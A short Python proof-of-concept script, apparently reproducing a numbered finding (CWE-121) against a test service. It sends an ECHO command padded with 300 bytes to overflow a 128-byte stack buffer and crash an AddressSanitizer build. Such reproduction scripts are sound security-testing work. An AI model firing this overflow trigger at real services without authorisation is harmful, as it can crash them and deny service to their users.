#!/usr/bin/env python3
"""V1 - Stack buffer overflow in ECHO (CWE-121).
Sends an ECHO argument far longer than the handler's 128-byte stack buffer.
Against the ASan build the service aborts with a stack-buffer-overflow report
on its stderr; no response is returned."""
import socket
import sys


def main() -> int:
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
    payload = b"ECHO " + b"A" * 300 + b"\n"
    with socket.create_connection((host, port), timeout=5) as s:
        s.sendall(payload)
        try:
            print("response:", s.recv(4096))
        except OSError as exc:
            print("connection dropped:", exc)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
